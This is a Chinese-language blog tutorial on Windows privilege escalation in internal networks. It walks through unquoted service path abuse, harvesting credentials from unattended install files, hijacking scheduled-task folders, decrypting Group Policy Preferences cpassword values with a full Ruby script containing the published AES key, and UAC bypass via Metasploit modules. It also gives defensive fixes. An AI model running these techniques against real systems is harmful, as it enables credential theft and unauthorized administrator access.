+<p>例如，有一个文件路径<code>&quot;C:\Program Files\Some Floder\Service.exe&quot;</code>。<strong>对于该路径中的每个空格，Windows都会尝试寻找并执行与空格前面的名字相匹配的程序。</strong>操作系统会对文件路径中空格的所有情况进行尝试，直至找到一个能够匹配的程序。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Program</span><br><span class="line">C:\Program Files\Some</span><br><span class="line">C:\Program Files\Some Floder\Service.exe</span><br></pre></td></tr></table></figure>
+
+<p>因此，如果一个被”适当”命名的可执行程序被上传到受影响的目录中，服务一旦重启，绝大多数情况下，该程序就会以System权限运行。</p>
+<p><strong>执行如下命令检测系统中是否存在该漏洞</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i <span class="string">"Auto"</span> |findstr /i /v <span class="string">"C:\Windows\\"</span> |findstr /i /v <span class="string">""</span><span class="string">"</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/28.png" alt="image-20200809211638932"></p>
+<p>我的这台机器没有这个漏洞，所以有点尴尬，这里写一下这个漏洞的利用方式。</p>
+<p>检测完是否存在此漏洞后，<strong>检测是否对目标文件夹有写权限，需要目标文件夹的权限是Everyone:(OI)(CI)(F)</strong></p>
+<p>检测方式：<code>icacls 目标文件夹路径</code></p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/29.png" alt="image-20200809212913469"></p>
+<p>像上图这样。</p>
+<p>确认目标机器中存在此漏洞后，把要上传的程序重命名并放置在存在此漏洞且可写的目录下，执行如下命令，尝试重启服务</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop service_name</span><br><span class="line">sc start service_name</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="自动安装配置文件"><a href="#自动安装配置文件" class="headerlink" title="自动安装配置文件"></a>自动安装配置文件</h2><p>网络管理员在内网中给多台机器配置同一个环境时，通常不会逐台配置，而会使用脚本化批量部署的方法。在这一过程中，会使用安装配置文件。这些文件中包含所有的安装配置信息，其中有一些可能包含<strong>本地管理员账号和密码等信息</strong>。</p>
+<p>对于该漏洞使用msf的利用模块<code>post/windows/gather/enum_unattend</code></p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/30.png" alt="image-20200809215248594"></p>
+<h2 id="计划时间"><a href="#计划时间" class="headerlink" title="计划时间"></a>计划时间</h2><p>可以使用如下命令查看计算机的计划任务</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo <span class="keyword">LIST</span> /v</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/31.png" alt="image-20200809220810787"></p>
+<p><code>AccessChk</code>用于进行一些系统或程序中的高级查询，管理和故障排除工作。</p>
+<p>执行如下命令，查看指定目录的权限配置情况。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -dqv <span class="string">"C:\Microsoft"</span> -accepteula</span><br></pre></td></tr></table></figure>
+
+<p><strong>如果攻击者以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序。</strong>这样在下次计划任务执行时，就会以高权限来运行恶意程序。</p>
+<p><code>AccessChk</code>是<code>SysInterals</code>工具包里的工具，下面是几个常见的<code>AccessChk</code>命令</p>
+<p>第一次运行<code>SysInternals</code>工具包里的工具时，需要许可，使用如下命令，自动接受许可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe /accepteula</span><br></pre></td></tr></table></figure>
+
+
+
+<p>列出某驱动器下所有权限配置有缺陷的文件夹</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwdqsUsersc:\</span><br><span class="line">accesschk.exe -uwdqs<span class="string">"AuthenticatedUsers"</span>c:\*.*</span><br></pre></td></tr></table></figure>
+
+
+
+<p>列出某驱动器下所有权限配置有缺陷的文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwdqsUsersc:\*.*</span><br><span class="line">accesschk.exe -uwdqs<span class="string">"AuthenticatedUsers"</span>c:\*.*</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Empire内置模块"><a href="#Empire内置模块" class="headerlink" title="Empire内置模块"></a>Empire内置模块</h2><p>外话：安装Empire时，出现了一些问题，在此列出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">选择安装使用Empire3<span class="number">.0</span></span><br><span class="line">改默认python为python3.X</span><br><span class="line">sudo ln -s /usr/bin/python3<span class="number">.8</span>  /usr/bin/python</span><br><span class="line">sudo ln -s /usr/local/bin/pip3 /usr/local/bin/pip</span><br><span class="line"></span><br><span class="line">无法成功安装M2Cryptop</span><br><span class="line">sudo apt-get install libssl-dev swig python3-dev gcc</span><br><span class="line">sudo apt-get install openssl</span><br><span class="line">pip install wheel</span><br></pre></td></tr></table></figure>
+
+<p><code>Empire3.0</code>：<a href="https://github.com/BC-SECURITY/Empire/" target="_blank" rel="noopener">https://github.com/BC-SECURITY/Empire/</a></p>
+<p>Empire使用参考：<a href="https://www.secpulse.com/archives/73766.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/73766.html</a></p>
+<h1 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h1><h2 id="组策略首选项提权简介"><a href="#组策略首选项提权简介" class="headerlink" title="组策略首选项提权简介"></a>组策略首选项提权简介</h2><p>SYSVOL是活动目录里的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控制器之间进行复制。SYSVOL文件夹是在安装活动目录时自动创建的，主要用来存放登陆脚本，组策略数据以及其他域控制器需要的域信息等。<strong>SYSVOL在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录的范围内共享。</strong></p>
+<p>整个SYSVOL目录在所有的域控制器中是自动同步和共享的，所有的域策略均存放在<code>C:\Windows\SYSVOL\DOMAIN\Policies</code>目录中</p>
+<p>在一般的域环境中，所有机器都是脚本批量部署的，数据量通常很大。为了方便对所欲的机器进行操作，网络管理员往往会使用域策略进行统一的配置和管理。<strong>大多数组织在创建域环境后，会要求加入域的计算机使用域用户进行登录验证</strong>。为了本地管理员密码的安全性，这些组织通常会修改本地管理员的密码</p>
+<p><strong>尽管如此，安全问题依旧存在。通过组策略统一修改的密码，虽然强度有所提高，但所有机器的本地管理员密码是相同的。攻击者获得一台机器的本地管理员密码，就相当于获得了整个域中所有机器的本地管理员密码。</strong></p>
+<p>常见的组策略首选项（Group Policy Preferences，GPP）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">映射驱动器（Drives.xml）</span><br><span class="line">创建本地用户</span><br><span class="line">数据源（DataSources.xml）</span><br><span class="line">打印机配置（Printers.xml）</span><br><span class="line">创建/更新服务（Services.xml）</span><br><span class="line">计划任务（ScheduledTasks.xml）</span><br></pre></td></tr></table></figure>
+
+<p>关于组策略首选项的了解，参考：<a href="https://blog.csdn.net/allway2/article/details/104101337" target="_blank" rel="noopener">https://blog.csdn.net/allway2/article/details/104101337</a></p>
+<h2 id="组策略首选项提权分析"><a href="#组策略首选项提权分析" class="headerlink" title="组策略首选项提权分析"></a>组策略首选项提权分析</h2><p>参考文章：<a href="https://blog.csdn.net/qq_36119192/article/details/104344105" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/104344105</a></p>
+<h3 id="创建组策略，批量修改域中机器的本地管理员密码"><a href="#创建组策略，批量修改域中机器的本地管理员密码" class="headerlink" title="创建组策略，批量修改域中机器的本地管理员密码"></a>创建组策略，批量修改域中机器的本地管理员密码</h3><p>在<code>Group Policy Management Editor</code>中打开计算机配置界面，新建一个组策略，更新本地计算机中用户的组策略首选项密码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在域控上执行：开始——&gt;运行——&gt;输入 gpmc.msc ——&gt;选择c0okb.org——&gt;右键组策略对象——&gt;新建</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/32.png" alt="image-20200810202155678"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">右键刚刚新建的组策略，编辑，会弹出一个组策略管理编辑器</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/33.png" alt="image-20200810202240559"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">计算机配置——&gt;首选项——&gt;控制面板设置——&gt;本地用户和组</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/34.png" alt="image-20200810203022287"></p>
+<p>将域中每个计算机的本地<code>administrator</code>用户更名为<code>BossBoy</code>….，并设置新的密码为<code>1qaz@WSX</code>.</p>
+<p>然后将Domain Computers添加到组策略应用的组中.</p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/35.png" alt="image-20200810203746673"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">强制更新组策略</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/36.png" alt="image-20200810204402574"></p>
+<h3 id="获取组策略的凭据"><a href="#获取组策略的凭据" class="headerlink" title="获取组策略的凭据"></a>获取组策略的凭据</h3><p>管理员在域中新建一个组策略后，操作系统会自动在SYSVO共享目录中生成一个XML文件，该文件中保存了该组策略更新后的密码。该密码使用AES-256加密算法，安全性还是比较高的。但是，2012年微软在官方网站上公布了该密码的私钥，导致保存在XML文件中的密码的安全性大大降低。<strong>任何域用户和域信任的用户均可对该共享目录进行访问，这就意味着，任何用户都可以访问保存在XML文件中的密码并将其解密，从而控制域中所有使用该账号、密码的本地管理员计算机。可通过在SYSVOL中搜索，可以找到Groups.xml文件。</strong></p>
+<p><strong>手动查找cpassword</strong></p>
+<p>通过详细信息中的唯一id定位</p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/37.png" alt="image-20200811083814797"></p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/38.png" alt="image-20200811083952657"></p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/39.png" alt="image-20200811084847555"></p>
+<p>使用脚本解密就好了</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gppdecrypto.rb</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'rubygems'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'base64'</span></span><br><span class="line">encrypted_data = <span class="string">"6IsqRFD6k9q5fWvZZPGGyAK9njRNN76NKTrLAfsvHGk"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(encrypted_data)</span></span></span><br><span class="line">    padding = <span class="string">"="</span> * (<span class="number">4</span> - (encrypted_data.length % <span class="number">4</span>))</span><br><span class="line">      epassword = <span class="string">"<span class="subst">#&#123;encrypted_data&#125;</span><span class="subst">#&#123;padding&#125;</span>"</span></span><br><span class="line">        decoded = Base64.decode64(epassword)</span><br><span class="line">           key = <span class="string">"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"</span></span><br><span class="line">             aes = OpenSSL::Cipher::Cipher.new(<span class="string">"AES-256-CBC"</span>)</span><br><span class="line">               aes.decrypt</span><br><span class="line">                 aes.key = key</span><br><span class="line">                   plaintext = aes.update(decoded)</span><br><span class="line">                     plaintext &lt;&lt; aes.final</span><br><span class="line">                       pass = plaintext.unpack(<span class="string">'v*'</span>).pack(<span class="string">'C*'</span>) <span class="comment"># UNICODE conversion</span></span><br><span class="line">                         <span class="keyword">return</span> pass</span><br><span class="line">                          <span class="keyword">end</span></span><br><span class="line">blah = decrypt(encrypted_data)</span><br><span class="line">puts blah</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/40.png" alt="image-20200811085509395"></p>
+<p><strong>使用PowerShell获取cpassword</strong></p>
+<p>PowerSploit中的Get-GPPPassword.ps1脚本可以获取组策略中的密码。注意，我们只需要在域内任何一台以域用户权限登录的机器上均可查询到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong>使用msf获取cpassword</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">post</span>/<span class="title">windows</span>/<span class="title">gather</span>/<span class="title">credentials</span>/<span class="title">gpp</span></span><br><span class="line"><span class="title">set</span> <span class="title">session</span> 1</span><br><span class="line"><span class="title">run</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="组策略首选项提权防范"><a href="#组策略首选项提权防范" class="headerlink" title="组策略首选项提权防范"></a>组策略首选项提权防范</h2><p>在用于管理组策略的计算机上安装 KB2962486补丁，防止新的凭据被放置在组策略首选项中。微软在2014年修复了组策略首选项提权漏洞，使用的方法就是不再将密码保存在组策略首选项中。</p>
+<p>此外，针对Everyone访问权限进行设置，具体如下：</p>
+<ul>
+<li>设置共享文件夹SYSVOL的访问权限</li>
+<li>将包含组策略密码的 XML 文件从 SYSVOL 目录中删除</li>
+<li>不要把密码放在所有域用户都有权访问的文件中</li>
+<li>如果需要更改域中机器的本地管理员密码，建议使用LAPS</li>
+</ul>
+<h1 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h1><p>果然计算机的操作系统版本是<code>Windows Vista或者更高</code>，在权限不够的情况下，访问系统磁盘的根目录（例如：C:\）、Windows目录、Program Files目录，以及读、写系统登陆数据库（Registry）的程序等操作，都需要经过UAC（User Account Control，用户账户控制）的认证才能进行。</p>
+<p>关于UAC的介绍参考：<a href="https://baijiahao.baidu.com/s?id=1631436227483974075&wfr=spider&for=pc" target="_blank" rel="noopener">https://baijiahao.baidu.com/s?id=1631436227483974075&amp;wfr=spider&amp;for=pc</a></p>
+<h2 id="绕过UAC提权的方法"><a href="#绕过UAC提权的方法" class="headerlink" title="绕过UAC提权的方法"></a>绕过UAC提权的方法</h2><h3 id="MSF的bypassuac模块"><a href="#MSF的bypassuac模块" class="headerlink" title="MSF的bypassuac模块"></a>MSF的bypassuac模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用这个模块的前提是我们已经获得了一个用户的<code>meterpreter Shell</code>，并且<strong>该用户在管理员组</strong>中，且<strong>UAC必须为默认设置</strong></p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/41.png" alt="image-20200811150542664"></p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/42.png" alt="image-20200811150624709"></p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/46.png" alt="image-20200811151411266"></p>
+<p>使用该模块</p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/43.png" alt="image-20200811150656169"></p>
+<p>执行</p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/44.png" alt="image-20200811150801550"></p>
+<p>提升权限</p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/45.png" alt="image-20200811150827474"></p>
+<h3 id="MSF的RunAs模块"><a href="#MSF的RunAs模块" class="headerlink" title="MSF的RunAs模块"></a>MSF的RunAs模块</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/local/ask</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用RunAs模块，进行提权，当前用户必须在管理员组中或者知道管理员的密码，对UAC的设置则没有要求。在使用RunAs模块时，需要使用EXE::customs选项创建一个可执行文件（需要进行免杀处理）</strong></p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/47.png" alt="image-20200811152800803"></p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/48.png" alt="image-20200811152913974"></p>
+<p>在输入run之后，在目标机器上会弹出UAC对话框，需要单击”是”</p>
+<p><strong>另外还有Empire的bypassuac模块，以及bypassuac_wscript模块</strong></p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">我是小吴啦</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">http://yoursite.com/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2020/07/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%B6%89/"><span>应急响应初涉</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1587989465494&amp;di=25bf7ddc1982d8dbb238d7a90a78781e&amp;imgtype=0&amp;src=http%3A%2F%2Fimgs.aixifan.com%2Fo_1c8epo34e1nji18d3hn917iv1rha65.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By 我是小吴啦</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
